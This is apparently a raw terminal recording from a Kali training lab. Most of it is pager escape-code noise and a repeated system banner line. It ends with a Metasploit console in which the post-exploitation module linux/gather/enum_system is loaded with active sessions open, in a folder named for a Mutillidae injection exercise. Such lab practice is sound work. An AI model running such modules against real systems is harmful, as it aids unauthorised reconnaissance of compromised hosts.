+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KCC[H[2J[H[H[2J[Hlab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64 GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KCC[H[2J[H[H[2J[H4 GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KCC[H[2J[H[H[2J[H
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[H4 GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[Hlab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64 GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KDD[H[2J[H[H[2J[HDistro: debian,Version: Kali GNU/Linux Rolling  , Kernel: Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64  GNU/Linux
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> db_
+db_connect        db_export         db_nmap           db_remove         db_status         
+db_disconnect     db_import         db_rebuild_cache  db_save           
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> db_re
+db_rebuild_cache  db_remove         
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> db_rebuild_cache 
+[0mThis command is deprecated with Metasploit 5
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> db_rebuild_cache [K[K[K[K[K[K[K[K[K[K[K[Kmove Interrupt: use the 'exit' command to quit
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> 
+[1m[34m[*][0m Server stopped.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/Echo_Message[01;31mdinesh@evil[00m: [[01;34mEcho_Message[00m] $ exit
+
+Script done on 2020-09-04 21:25:08+05:30 [COMMAND_EXIT_CODE="0"]
